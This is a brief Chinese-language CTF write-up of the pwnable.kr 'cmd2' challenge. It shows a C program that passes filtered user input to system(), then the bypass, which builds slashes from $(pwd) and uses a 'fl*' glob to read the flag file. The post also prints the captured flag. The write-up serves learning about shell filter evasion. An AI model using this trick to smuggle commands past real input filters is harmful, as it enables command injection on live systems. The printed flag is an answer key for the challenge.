---
title: 'pwnable.kr #cmd2'
metaAlignment: center
coverMeta: out
thumbnailImagePosition: left
date: 2017-07-08 05:06:12
categories:
    - Writeups
	  - pwnable.kr
thumbnailImage: pwnablekr.jpg
keywords:
    - pwnable.kr
    - Toddler's Bottle
    - cmd2
tags:
    - Writeups
---
cmd1 的進階題！
<!-- more -->

原始碼：
```c
#include <stdio.h>
#include <string.h>

int filter(char* cmd){
	int r=0;
	r += strstr(cmd, "=")!=0;
	r += strstr(cmd, "PATH")!=0;
	r += strstr(cmd, "export")!=0;
	r += strstr(cmd, "/")!=0;
	r += strstr(cmd, "`")!=0;
	r += strstr(cmd, "flag")!=0;
	return r;
}

extern char** environ;
void delete_env(){
	char** p;
	for(p=environ; *p; p++)	memset(*p, 0, strlen(*p));
}

int main(int argc, char* argv[], char** envp){
	delete_env();
	putenv("PATH=/no_command_execution_until_you_become_a_hacker");
	if(filter(argv[1])) return 0;
	printf("%s\n", argv[1]);
	system( argv[1] );
	return 0;
}
```

可以看到相較於cmd1，條件限制更嚴苛了，修改環境變數或是使用絕對路徑的方式都會被過濾。

其實還有一個方法可以使用絕對路徑但斜線又不會被過濾到，利用Linux指令`pwd`顯示當前路徑的方法，只要先進到根目錄，那麼`pwd`就會是`/`，便可以構造出像這樣的字串：
```sh
cmd2@ubuntu:~$ cd /
cmd2@ubuntu:/$ ./home/cmd2/cmd2 '""$(pwd)bin$(pwd)cat $(pwd)home$(pwd)cmd2$(pwd)fl*""'
""$(pwd)bin$(pwd)cat $(pwd)home$(pwd)cmd2$(pwd)fl*""
FuN_w1th_5h3ll_v4riabl3s_haha
```